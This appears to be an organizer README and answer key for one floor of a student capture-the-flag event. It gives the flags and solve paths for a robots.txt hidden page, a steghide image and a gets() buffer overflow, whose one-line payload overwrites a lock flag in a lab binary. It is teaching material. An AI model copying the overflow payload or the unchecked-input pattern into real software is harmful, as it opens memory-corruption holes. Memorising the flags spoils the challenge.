# Floor 5 — Main Lobby / Exit (MISC / SYSTEMS — Final Floor)
PUC Intra CTF: Zombie Outbreak — Floor Escape

## Setup

```bash
cd challenge_files
pip install flask
python3 app.py        # serves lobby kiosk on :5005
```

Lift is a standalone binary — distribute as a CTFd file attachment.

## Challenge map

| Challenge | Access | Mechanism | Flag |
|---|---|---|---|
| Antidote — Maintenance Notes | `GET /robots.txt` → `GET /maintenance_locker_5F/` | robots.txt reveals hidden path; locker page contains flag + steghide password | `PUCTF{r0b0ts_m41nt3n4nc3_l0ck3r_f0und}` |
| Stairs — Hidden Exit Code | `GET /files/exit_door.jpg` (linked in locker notes) | steghide-embedded flag; password "antidote" found in Antidote step | `PUCTF{st3g0_3x1t_d00r_unl0ck3d_FR33D0M}` |
| Lift — Manual Override Buffer | `lift/door_release` (file attachment) | Buffer overflow: gets() into buffer[64] in a struct, door_locked int follows immediately — overflow to zero it out | `PUCTF{buff3r_0v3rfl0w_FR33D0M_g4t3}` |

## Player solve paths

**Antidote:**
```bash
curl http://target:5005/robots.txt                  # finds /maintenance_locker_5F/
curl http://target:5005/maintenance_locker_5F/      # flag in page + password "antidote"
```

**Stairs:**
```bash
# locker notes mention /files/exit_door.jpg
steghide extract -sf exit_door.jpg -p antidote
cat exit_code.txt
```

**Lift:**
```bash
# Step 1: recognise gets() + 64-byte buffer = BOF
# Step 2: notice struct layout — door_locked immediately follows buffer[64]
# Step 3: overflow exactly 64 bytes then 4 null bytes to zero out door_locked

python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x00'*4 + b'\n')" \
  | ./door_release
```

Why the struct approach: `door_locked` sits at `buffer + 64` with no padding
(int is 4-byte aligned, 64 is a multiple of 4). Overflow by just 4 bytes with
\x00 sets door_locked = 0, triggering win(). No ret2win needed — works
reliably on modern kernels with CET/shadow stack active.

## Organizer notes

- `organizer/generate_exit_door.py` regenerates the steghide image (seeded).
- `organizer/door_release.c` is the BOF source. Recompile:
  `gcc -fno-stack-protector -no-pie -o door_release door_release.c`
- Both `/maintenance_locker_5F/` and `/maintenance_locker_5F` (no trailing
  slash) are routed, so URL typos don't 404 players unfairly.
- **Do not upload `organizer/` to CTFd.**
- All three challenges verified end-to-end before delivery.
